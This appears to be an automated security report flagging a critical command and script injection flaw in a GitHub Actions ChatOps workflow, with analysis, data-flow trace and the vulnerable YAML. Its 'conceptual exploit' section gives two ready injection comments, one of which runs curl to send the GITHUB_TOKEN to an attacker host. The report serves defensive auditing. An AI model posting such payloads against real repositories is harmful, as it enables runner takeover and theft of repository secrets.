# 🔒 CodeMender Security Report

*Generated: 2026-10-13 16:35:24 UTC*

## Summary

**Total findings: 1**

| Severity | Count |
|----------|-------|
| 🔴 CRITICAL | 1 |

| Status | Count |
|--------|-------|
| 🔴 OPEN | 1 |

## Findings

| ID | Severity | Confidence | Status | Fix | File | Title |
|----|----------|------------|--------|-----|------|-------|
| `ece02b4e` | 🔴 CRITICAL | 100% | OPEN | — | `.github/workflows/codemender-chatops.yml` | Unauthenticated GitHub Actions Script & Command Injection in ChatOps Workflow |

## Details

### 1. 🔴 Unauthenticated GitHub Actions Script & Command Injection in ChatOps Workflow (`ece02b4e`)

- **Severity**: 🔴 CRITICAL
- **Status**: OPEN
- **Type**: CWE-94
- **File**: `.github/workflows/codemender-chatops.yml` (L20–258)
- **Confidence**: 100%

<details>
<summary>Analysis</summary>

### Vulnerability Analysis

The workflow `.github/workflows/codemender-chatops.yml` is triggered by `issue_comment` (`types: [created]`) whenever a user posts a comment on an active pull request starting with `/verify ` or `/fix `. Because `issue_comment` workflows run in the context of the target repository's default branch, they execute with privileged tokens (`contents: write`, `pull-requests: write`, `id-token: write`) and access to repository secrets (including Google Cloud Workload Identity Federation credentials).

Crucially:
1. **Missing Authorization Guard**: There is no check verifying that `github.event.comment.author_association` is `OWNER`, `MEMBER`, or `COLLABORATOR`. Any external GitHub user can comment on a pull request to trigger the workflow.
2. **Expression / Command Injection via Bash Script Interpolation (Step 5)**:
   In step 4 ("Stage ChatOps Inputs & Execute Cloud Run Job"), `FINDING_ID` is extracted via `FINDING_ID=$(echo "$COMMENT_BODY" | awk '{print $2}')`. It is concatenated into `OUTPUT_URI="${TASK_PREFIX}/output"` and exported via `echo "output_uri=${OUTPUT_URI}" >> "$GITHUB_OUTPUT"`. In step 5 ("Download Cloud Run Job Outputs"), which has `if: always() && steps.execute-cmd.outputs.output_uri != ''`, the output is directly interpolated into a bash script:
   ```bash
   OUTPUT_URI="${{ steps.execute-cmd.outputs.output_uri }}"
   ```
   Because GitHub Actions performs string interpolation prior to invoking bash, any command substitution payload such as `$(...)` in `FINDING_ID` is evaluated by bash in double quotes, leading to arbitrary command execution.
3. **Expression / Script Injection via github-script (Step 7)**:
   In step 7 ("Comment Results on Pull Request"), which also runs with `if: always()`, the finding ID output is interpolated directly into an `actions/github-script` JavaScript snippet:
   ```javascript
   const findingId = '${{ steps.execute-cmd.outputs.finding_id }}';
   ```
   An attacker can break out of the single-quoted string literal and execute arbitrary Node.js code in the runner context.

### Conceptual Exploit Payload

An external user comments on any open pull request:

```text
/verify $(id>/tmp/pwned)
```
Or for Node.js script injection in step 7:
```text
/verify ';require('child_process').execSync('curl${IFS}https://attacker.com/exfil?token='+$GITHUB_TOKEN);//
```

Data Flow Trace:
1. **Source**: An untrusted comment posted on a pull request enters via `github.event.comment.body`.
2. **Missing Validation**: The job condition at lines 22-24 does not check commenter authorization. In step 4 (lines 72, 88-89, 94-95), `awk '{print $2}'` splits on whitespace without checking or sanitizing special characters in `FINDING_ID`.
3. **Sinks**:
   - In Step 5 (line 163): `OUTPUT_URI="${{ steps.execute-cmd.outputs.output_uri }}"` evaluates in bash to `OUTPUT_URI="gs://.../$(id>/tmp/pwned)/output"`, executing `id>/tmp/pwned`.
   - In Step 7 (line 201): `const findingId = '${{ steps.execute-cmd.outputs.finding_id }}';` evaluates to `const findingId = '';require('child_process').execSync(...);//';` inside Node.js.
Both sinks execute due to `if: always()`, resulting in unauthenticated Remote Code Execution on the GitHub Actions runner.

</details>

<details>
<summary>Vulnerable Snippet</summary>

```
jobs:
  chatops-remediation:
    # Trigger only if comment starts with /verify or /fix on an active Pull Request
    if: >
      github.event.issue.pull_request &&
      (startsWith(github.event.comment.body, '/verify ') || startsWith(github.event.comment.body, '/fix '))
...
      - name: Stage ChatOps Inputs & Execute Cloud Run Job
        id: execute-cmd
        env:
          COMMENT_BODY: ${{ github.event.comment.body }}
        run: |
          set -euo pipefail
          COMMAND=$(echo "$COMMENT_BODY" | awk '{print $1}')
          FINDING_ID=$(echo "$COMMENT_BODY" | awk '{print $2}')
...
          echo "finding_id=${FINDING_ID}" >> "$GITHUB_OUTPUT"
          echo "output_uri=${OUTPUT_URI}" >> "$GITHUB_OUTPUT"
...
      - name: Download Cloud Run Job Outputs
        if: always() && steps.execute-cmd.outputs.output_uri != ''
        run: |
          OUTPUT_URI="${{ steps.execute-cmd.outputs.output_uri }}"
...
      - name: Comment Results on Pull Request
        if: always()
        uses: actions/github-script@v7
        with:
          script: |
            const fs = require('fs');
            const cmdType = '${{ steps.execute-cmd.outputs.cmd_type }}';
            const findingId = '${{ steps.execute-cmd.outputs.finding_id }}';
```

</details>

---


---
### 💬 CodeMender ChatOps Commands
Comment on this Pull Request using the Finding ID or Index below:
- **Verify exploitability:** `/verify <finding_id>`
- **Generate & commit fix:** `/fix <finding_id>`

| Index | Finding ID | Rule ID | Location | ChatOps Commands |
| :--- | :--- | :--- | :--- | :--- |
| `0` | `0` | `CWE-94` | `.github/workflows/codemender-chatops.yml:20` | `/verify 0` <br> `/fix 0` |
